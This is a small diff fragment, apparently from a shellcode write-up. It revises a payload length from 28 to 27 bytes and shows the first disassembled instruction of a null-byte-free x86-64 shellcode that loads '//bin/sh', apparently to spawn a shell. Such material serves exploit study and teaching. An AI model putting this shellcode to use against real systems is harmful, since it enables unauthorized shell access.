@@ -30,7 +30,7 @@ Shell Code in String format :
 
 same code but with no bad chars "0x00"
 
-Length : 28 bytes
+Length : 27 bytes
 
 Code: 
 48 b9 2f 2f 62 69 6e 	|  movabs rcx,0x68732f6e69622f2f
